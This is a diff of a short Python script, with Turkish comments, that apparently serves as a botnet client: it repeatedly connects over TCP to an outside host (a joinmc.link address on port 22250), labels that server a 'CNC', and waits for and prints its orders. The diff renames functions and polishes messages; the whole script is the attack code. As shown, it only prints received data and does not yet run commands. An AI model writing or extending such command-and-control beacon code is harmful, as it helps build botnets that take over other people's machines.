@@ -1,26 +1,27 @@
 import socket
 import time
 
-# BU IKI AYARI MILIMETRIK KONTROL ET
-KISLA_HOST = "usb-metallic.gl.joinmc.link"
-KISLA_PORT = 22250 # nslookup ile buldugun port
+# BU AYARLARI MILIMETRIK KONTROL ET
+HOST = "usb-metallic.gl.joinmc.link"
+PORT = 22250  # nslookup ile bulduğumuz gerçek port
 
-def kislaya_gir():
+def mars_bas():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            print(f"[*] Kislaya mars basiliyor... {KISLA_HOST}:{KISLA_PORT}")
-            s.connect((KISLA_HOST, KISLA_PORT))
-            print("[+] KISLAYA GIRILDI! Kapıdan geçtik.")
+            print(f"[*] Kışlaya bağlanılıyor... {HOST}:{PORT}")
+            s.connect((HOST, PORT))
+            print("[+] KISLAYA GIRILDI! Emir bekleniyor...")
             
-            # Baglanti acik kalsin diye bekliyoruz
+            # Bağlantı kopmasın diye bekliyoruz
             while True:
                 data = s.recv(1024)
                 if not data: break
-                print(f"[*] CNC'den mesaj var: {data.decode()}")
+                print(f"[*] CNC'den mesaj: {data.decode()}")
         except Exception as e:
-            print(f"[-] Kislaya girilemedi: {e}")
+            # Hata neyse onu görelim: Connection Refused mı, Timeout mu?
+            print(f"[-] Giriş Başarısız: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
-    kislaya_gir()
+    mars_bas()
